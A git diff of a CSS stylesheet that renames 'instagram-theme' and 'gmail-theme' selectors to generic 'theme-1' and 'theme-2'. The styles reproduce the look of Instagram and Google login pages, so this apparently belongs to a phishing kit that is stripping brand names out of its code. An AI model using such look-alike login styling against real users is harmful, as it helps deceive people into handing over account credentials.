@@ -250,16 +250,16 @@ form button:hover::after {
 
 /* --- THEME SUPPORT (Optimized) --- */
 
-/* Instagram Theme */
-body.instagram-theme {
-    background: #fafafa; /* Solid background for authentic Insta look */
+/* Theme 1 */
+body.theme-1 {
+    background: #fafafa; /* Solid background for authentic look */
 }
 
-body.instagram-theme::before {
+body.theme-1::before {
     display: none;
 }
 
-body.instagram-theme .container {
+body.theme-1 .container {
     background: white;
     border: 1px solid #dbdbdb;
     box-shadow: none;
@@ -267,13 +267,13 @@ body.instagram-theme .container {
     max-width: 350px;
 }
 
-body.instagram-theme .logo img {
+body.theme-1 .logo img {
     width: 175px;
     animation: none;
     filter: none;
 }
 
-body.instagram-theme button {
+body.theme-1 button {
     background-color: #0095f6;
     border-radius: 4px;
     font-size: 14px;
@@ -283,13 +283,13 @@ body.instagram-theme button {
     box-shadow: none;
 }
 
-body.instagram-theme button:hover {
+body.theme-1 button:hover {
     background-color: #1877f2;
     transform: none;
     box-shadow: none;
 }
 
-body.instagram-theme input {
+body.theme-1 input {
     background: #fafafa;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
@@ -299,23 +299,23 @@ body.instagram-theme input {
     box-shadow: none;
 }
 
-body.instagram-theme input:focus {
+body.theme-1 input:focus {
     border: 1px solid #a8a8a8;
     transform: none;
     box-shadow: none;
 }
 
-/* Gmail Theme */
-body.gmail-theme {
+/* Theme 2 */
+body.theme-2 {
     background: #fff;
     font-family: 'Google Sans', 'Roboto', arial, sans-serif;
 }
 
-body.gmail-theme::before {
+body.theme-2::before {
     display: none;
 }
 
-body.gmail-theme .container {
+body.theme-2 .container {
     border: 1px solid #dadce0;
     border-radius: 8px;
     padding: 48px 40px 36px;
@@ -324,21 +324,21 @@ body.gmail-theme .container {
     background: white;
 }
 
-body.gmail-theme .logo img {
+body.theme-2 .logo img {
     width: 75px;
     animation: none;
     filter: none;
     margin-bottom: 10px;
 }
 
-body.gmail-theme h1 {
+body.theme-2 h1 {
     font-weight: 400;
     font-size: 24px;
     color: #202124;
     margin-bottom: 10px;
 }
 
-body.gmail-theme button {
+body.theme-2 button {
     background-color: #1a73e8;
     border-radius: 4px;
     font-size: 14px;
@@ -350,13 +350,13 @@ body.gmail-theme button {
     box-shadow: none;
 }
 
-body.gmail-theme button:hover {
+body.theme-2 button:hover {
     background-color: #287ae6;
     box-shadow: 0 1px 2px rgba(60,64,67,0.3);
     transform: none;
 }
 
-body.gmail-theme input {
+body.theme-2 input {
     border: 1px solid #dadce0;
     border-radius: 4px;
     padding: 13px 15px;
@@ -366,7 +366,7 @@ body.gmail-theme input {
     box-shadow: none;
 }
 
-body.gmail-theme input:focus {
+body.theme-2 input:focus {
     border: 2px solid #1a73e8;
     padding: 12px 14px; /* Adjust for border width change */
     transform: none;
